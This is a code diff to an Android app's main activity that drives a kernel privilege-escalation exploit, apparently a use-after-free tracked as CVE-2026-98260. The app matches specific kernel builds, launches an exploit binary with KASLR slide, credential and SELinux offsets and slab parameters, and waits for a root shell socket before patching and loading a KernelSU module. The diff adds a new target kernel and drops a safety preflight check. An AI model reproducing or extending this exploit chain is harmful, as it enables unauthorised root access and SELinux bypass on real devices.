@@ -76,12 +76,17 @@ public final class MainActivity extends ComponentActivity implements UiActions {
     private static volatile String WORK;
     private static final String LEGACY_KERNEL =
             "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k";
-    private static final String CVE_98260_KERNEL =
+    private static final String CVE_98260_115_KERNEL =
             "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k";
+    private static final String CVE_98260_117_KERNEL =
+            "6.18.21-android17-5-gfee2325de189-abogki572422516-4k";
     private static final String CVE_98260_LEGACY_ROOT_SOCKET =
             "/data/local/tmp/cve98260-root.sock";
     private static final String CVE_98260_ROOT_SOCKET_PREFIX =
             "/data/local/tmp/cve98260-root-";
+    private static final long CVE_98260_QUIET_WAIT_MS = 15_000L;
+    private static final long CVE_98260_POLL_INTERVAL_MS = 15_000L;
+    private static final long CVE_98260_ROOT_TIMEOUT_MS = 5 * 60_000L;
     private static final String MANAGER = "me.weishu.kernelsu";
     private static final long MANAGER_VERSION_CODE = 32680;
     private static final String MANAGER_CERT_SHA256 =
@@ -531,7 +536,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
             String kernel = probe("uname -r").trim();
             if (kernel.isEmpty())
                 return;
-            boolean isCve98260Kernel = CVE_98260_KERNEL.equals(kernel);
+            boolean isCve98260Kernel = isKnownCve98260Kernel(kernel);
             ui.post(() -> {
                 uiState.setLegacyAllowed(!isCve98260Kernel);
                 if (isCve98260Kernel)
@@ -761,7 +766,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
             log("实际内核：" + kernel + "；默认利用链为 98260。");
 
             ExploitChoice requested = uiState.getExploitChoice();
-            boolean isCve98260Kernel = CVE_98260_KERNEL.equals(kernel);
+            boolean isCve98260Kernel = isKnownCve98260Kernel(kernel);
             ui.post(() -> {
                 uiState.setLegacyAllowed(!isCve98260Kernel);
                 if (isCve98260Kernel)
@@ -772,7 +777,8 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                 log("实际内核精确匹配 98260 目标，已强制选择 CVE-2026-98260。");
             log("最终利用链：" + route.getLabel());
 
-            cleanupHelpers();
+            if (route == ExploitChoice.LEGACY_64560)
+                cleanupHelpers();
             setSystemStatus("正在准备提权", "已选择 " + route.getLabel() + " 利用链", false);
             stage("准备公共组件");
             prepareWorkDirectory();
@@ -822,8 +828,12 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         }
     }
 
+    private static boolean isKnownCve98260Kernel(String kernel) {
+        return CVE_98260_115_KERNEL.equals(kernel) || CVE_98260_117_KERNEL.equals(kernel);
+    }
+
     private ExploitChoice resolveExploit(String kernel, ExploitChoice requested) {
-        if (CVE_98260_KERNEL.equals(kernel))
+        if (isKnownCve98260Kernel(kernel))
             return ExploitChoice.CVE_98260;
         return requested == ExploitChoice.LEGACY_64560
                 ? ExploitChoice.LEGACY_64560 : ExploitChoice.CVE_98260;
@@ -991,24 +1001,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
             if (!parked.isEmpty())
                 throw new IllegalStateException(
                         "检测到已有 98260 进程（pid " + parked + "）但 root 通道不可用；请重启设备，不要重复启动");
-            stage("CVE-2026-98260 只读预检");
-            String preflight = shell("cd " + WORK + " && ./cve98260_plant --preflight"
-                    + " --timer-link " + hex(profile.timerLink)
-                    + " --cred-link " + hex(profile.credLink)
-                                        + " --selinux-link " + hex(profile.selinuxLink)
-                    + " --user-ns " + hex(profile.userNs)
-                    + " --root-user " + hex(profile.rootUser)
-                    + " --groups " + hex(profile.groups)
-                    + " --ucounts " + hex(profile.ucounts)
-                    + " --kitimer-size " + profile.kitimerSize
-                    + " --kitimer-node " + profile.kitimerNode
-                    + " --task-cred " + profile.taskCred
-                    + " --cred-size " + profile.credSize
-                    + " --slab-objects " + profile.slabObjects
-                    + " --slab-pages " + profile.slabPages);
-            logImportantLines(preflight, "[preflight]");
-            if (!preflight.contains("[preflight] RESULT=OK"))
-                throw new IllegalStateException("98260 预检未通过，已停止，未启动内存回收");
+            log("98260 CLI 等价路径：跳过预检，启动后静默等待。");
         }
 
         stage("抓取 98260 KASLR");
@@ -1016,12 +1009,6 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                 + " --site-low " + hex(profile.slideSiteLow));
         long slide = parseCve98260Slide(probeOut, profile.timerLink);
         log("98260 slide=" + hex(slide));
-
-        stage("生成 KernelSU 模块");
-        byte[] template = readProfileResource(profile.moduleAsset);
-        Map<String, Long> symbols = loadSymbols(profile.symbolsAsset);
-        byte[] module = patchModule(template, symbols, slide);
-        stageBytes("ksu-patched.ko", module, "644");
 
         if (!reuseRoot) {
             stage("启动 CVE-2026-98260");
@@ -1031,7 +1018,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                     + "'"
                     + "; then echo ROOT_SOCKET_CLEAN_FAILED; exit 1; fi"
                     + " && (PC98260_SOCK='" + cve98260RootSocket
-                    + "' nohup ./cve98260_plant --slide " + hex(slide)
+                    + "' /system/bin/setsid ./cve98260_plant --slide " + hex(slide)
                     + " --timer-link " + hex(profile.timerLink)
                     + " --cred-link " + hex(profile.credLink)
                                         + " --selinux-link " + hex(profile.selinuxLink)
@@ -1045,6 +1032,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                     + " --cred-size " + profile.credSize
                     + " --slab-objects " + profile.slabObjects
                     + " --slab-pages " + profile.slabPages
+                    + " --padding-timers 4096"
                     + " > cve98260.log 2>&1 < /dev/null & echo STARTED)");
             log(start.trim());
             if (start.contains("ROOT_SOCKET_CLEAN_FAILED")
@@ -1053,6 +1041,12 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                         "98260 启动失败：残留 root Socket 无法清理，请重启设备后重试");
             waitForCve98260Root();
         }
+
+        stage("生成 KernelSU 模块");
+        byte[] template = readProfileResource(profile.moduleAsset);
+        Map<String, Long> symbols = loadSymbols(profile.symbolsAsset);
+        byte[] module = patchModule(template, symbols, slide);
+        stageBytes("ksu-patched.ko", module, "644");
 
         stage("加载 KernelSU 模块");
         boolean moduleLive = shell(
@@ -1137,29 +1131,49 @@ public final class MainActivity extends ComponentActivity implements UiActions {
     }
 
     private void waitForCve98260Root() throws Exception {
-        long deadline = System.currentTimeMillis() + TimeUnit.MINUTES.toMillis(5);
-        long nextLog = 0;
+        log("98260 已启动；静默等待 " + TimeUnit.MILLISECONDS.toSeconds(
+                CVE_98260_QUIET_WAIT_MS) + " 秒后再验收。");
+        Thread.sleep(CVE_98260_QUIET_WAIT_MS);
+
+        long deadline = System.currentTimeMillis() + CVE_98260_ROOT_TIMEOUT_MS;
         while (System.currentTimeMillis() < deadline) {
-            String id = probe(cve98260SuCommand("-c 'id' 2>/dev/null")).trim();
+            String snapshot = probe(
+                    "echo __H1_ID__; "
+                            + cve98260SuCommand("-c 'id' 2>/dev/null")
+                            + "; echo __H1_LOG__; tail -n 80 " + WORK
+                            + "/cve98260.log 2>/dev/null; echo __H1_PID__; "
+                            + "pidof cve98260_plant 2>/dev/null");
+            int idAt = snapshot.indexOf("__H1_ID__");
+            int logAt = snapshot.indexOf("__H1_LOG__");
+            int pidAt = snapshot.indexOf("__H1_PID__");
+            String id = idAt >= 0
+                    ? snapshot.substring(idAt + "__H1_ID__".length(),
+                            logAt >= 0 ? logAt : snapshot.length()).trim()
+                    : snapshot.trim();
+            String tail = logAt >= 0
+                    ? snapshot.substring(logAt + "__H1_LOG__".length(),
+                            pidAt >= 0 ? pidAt : snapshot.length()).trim()
+                    : "";
+            String running = pidAt >= 0
+                    ? snapshot.substring(pidAt + "__H1_PID__".length()).trim()
+                    : "";
+
             if (id.contains("uid=0")) {
                 log("98260 root 通道已就绪：" + id.replace("\n", " | "));
                 return;
             }
-            String tail = probe("tail -n 120 " + WORK
-                    + "/cve98260.log 2>/dev/null");
-            if (tail.contains("missed page; holding zombie"))
+            if (tail.contains("unsafe state; holding process")
+                    || tail.contains("leak failed")) {
+                logImportantLines(tail, "");
                 throw new IllegalStateException(
-                        "98260 多次回收失败并已停放 UAF 进程；请重启设备后再试");
-            String running = probe("pidof cve98260_plant 2>/dev/null").trim();
-            if (running.isEmpty() && tail.isBlank())
+                        "98260 本轮回收失败并已停放 UAF 进程；请重启设备后再试");
+            }
+            if (running.isEmpty() && tail.isEmpty())
                 throw new IllegalStateException(
                         "98260 进程未启动且没有日志；请重启设备后重试");
-            long now = System.currentTimeMillis();
-            if (now >= nextLog) {
-                logImportantLines(tail, "");
-                nextLog = now + TimeUnit.MINUTES.toMillis(1);
-            }
-            Thread.sleep(5000);
+
+            logImportantLines(tail, "");
+            Thread.sleep(CVE_98260_POLL_INTERVAL_MS);
         }
         throw new IllegalStateException("98260 等待 root 超时；请重启设备后再次运行");
     }
